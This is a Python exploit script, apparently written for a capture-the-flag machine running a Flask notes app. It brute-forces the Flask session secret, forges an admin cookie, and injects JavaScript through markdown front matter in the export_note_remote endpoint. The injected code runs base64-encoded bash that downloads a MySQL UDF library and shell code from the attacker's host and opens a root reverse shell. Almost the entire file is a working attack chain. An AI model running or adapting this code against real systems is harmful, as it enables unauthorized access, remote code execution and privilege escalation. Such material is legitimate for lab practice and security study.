import sys, signal, argparse, json, time, hashlib, requests, random, string, subprocess, shlex, os
from pwn import *
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
from flask.json.tag import TaggedJSONSerializer

# debugging
import pdb

# ctrl + c
def signal_handler(signum, frame):
    log.failure("Interruption")
    os.system(f'rm {file_name}')
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# arguments
parser = argparse.ArgumentParser(description='Get reverse shell')
parser.add_argument('-ip', type=str, required=True, help='ip-address to receive the shell')
parser.add_argument('-port', type=str, required=True, help='local port to receive the shell')
args = parser.parse_args()

# global variables
target_url = 'http://10.10.11.160:5000'
target_session_payload = dict(logged_in=True,username='blue')
file_name = 'pwned.md'
lib_name = 'lib_mysqludf_sys_64.so'
shell_name = 'pwned_mysqlUDF.py'
commands = ['/usr/bin/mkdir /tmp/privesc', 'cd /tmp/privesc; /usr/bin/wget http://{}:{}/{}', '/usr/bin/python3 /tmp/privesc/{} {} {}']

# malicious payload to rce(js)
# - - - - - - - - - - - - - - -
# ---js
#
#     ((require("child_process")).execSync("{reverse shell}"))
#   
# ---

# get random string
def get_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

# get new user cookie
def get_cookie():
    p = log.progress('Creating user')
    time.sleep(1)
    try:
        s = requests.Session()
        # register
        user = get_random_string(5)
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        data = '&'.join(('name={d}', 'email={d}@gmail.com', 'username={d}', 'password={d}', 'confirm={d}')).format(d=user)
        s.post(f'{target_url}/register', headers=headers, data=data)
        # login
        data = '&'.join(('username={d}', 'password={d}')).format(d=user)
        s.post(f'{target_url}/login', data=data, headers=headers)
        # get cookie
        session_cookie = s.cookies.get_dict();
        p.success('Username -> {d} , Password -> {d}'.format(d=user))
    except Exception as e:
        p.failure('{} ocurred'.format(e))
    return session_cookie

# create wordlist
def load_wordlist():
    with open('all.txt', 'r') as file:
        wordlist = file.readlines()
    return wordlist

# bruteforce new user cookie
def bruteforce_cookie(wordlist):
    cookie = get_cookie()
    p = log.progress('Starting Brute-force attack')
    time.sleep(1)
    for secret in wordlist:
        secret = secret.strip('\n')
        p.status('{}'.format(secret))
        try:
            serializer = URLSafeTimedSerializer(
                        secret_key=secret,
                        salt='cookie-session',
                        serializer=TaggedJSONSerializer(),
                        signer=TimestampSigner,
                        signer_kwargs={
                                'key_derivation' : 'hmac',
                                'digest_method' : hashlib.sha1
                            }
                        ).loads(cookie['session'])
            log.info('Payload : {}'.format(serializer))
        except BadSignature:
            continue
        log.success("Secret key : {}".format(secret))
        return secret

# craft target cookie
def create_cookie(secret_key):
    time.sleep(1)
    p = log.progress('Creating new cookie with target payload')
    p.status(json.dumps(target_session_payload))
    try:
        serializer =  URLSafeTimedSerializer(
                            secret_key=secret_key, 
                            salt='cookie-session', 
                            serializer=TaggedJSONSerializer(), 
                            signer=TimestampSigner, 
                            signer_kwargs={
                                'key_derivation':'hmac',
                                'digest_method': hashlib.sha1
                                }
                            ).dumps(target_session_payload)
        time.sleep(1)
        log.success('Cookie : {}'.format(serializer))
        return serializer
    except Exception as e:
        p.failure('{} ocurred'.format(e))

# create malicious file
def create_file(command):
    try:
        with open(file_name, 'w') as file:
            b64_command = 'echo "{}" | /usr/bin/base64 -w 0'.format(command)
            payload = subprocess.run(b64_command, capture_output=True, text=True, shell=True).stdout.strip('\n')
            file.write("""---js\n\n\t((require("child_process")).execSync("echo {} | /usr/bin/base64 -d | /bin/bash"))\n\n---""".format(payload))
    except Exception as e:
        print(e)
                                                                    
# get reverse shell
def get_reverse_shell(target_cookie):
    time.sleep(1)
    p = log.progress('Getting reverse shell')
    p.status('IP -> {}, PORT -> {}'.format(args.ip, args.port))
    try:
        # web server to share pwned file
        log.info('Openning port 8000 to share files: {}, {}, {}'.format(file_name, lib_name, shell_name))
        command = '/usr/bin/python3 -m http.server 8000'
        p1 = subprocess.Popen(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        # web server to receive shell
        log.info('Open the port {p} to receive the shell (e.g : nc -lvnp {p})'.format(p=args.port))
        input('Press ENTER to continue')
        time.sleep(2)
        # upload pwned file
        log.info('Uploading and executing malicious files')
        # create directory
        create_file(commands[0])
        s = requests.Session()
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        data = 'url=http://{}:8000/{}'.format(args.ip, file_name)
        cookie = dict(session=target_cookie)
        s.post(f'{target_url}/export_note_remote', data=data, headers=headers, cookies=cookie)
        # enter directory and download malicious library
        create_file(commands[1].format(args.ip, 8000, lib_name))
        s.post(f'{target_url}/export_note_remote', data=data, headers=headers, cookies=cookie)
        # enter directory and download shell code
        create_file(commands[1].format(args.ip, 8000, shell_name))
        s.post(f'{target_url}/export_note_remote', data=data, headers=headers, cookies=cookie)
        # execute shell code to receive shell like root
        create_file(commands[2].format(shell_name, args.ip, args.port))
        s.post(f'{target_url}/export_note_remote', data=data, headers=headers, cookies=cookie)
        # kill subprocess
        p1.kill()
    except Exception as e:
        p.failure('{} ocurred'.format(e))

if __name__ == '__main__':
    key = bruteforce_cookie(load_wordlist())
    target_cookie = create_cookie(key)
    get_reverse_shell(target_cookie)
    os.system(f'rm {file_name}')

# References
#---------------------------------------------------
#https://github.com/Paradoxis/Flask-Unsign
#https://github.com/Paradoxis/Flask-Unsign-Wordlist
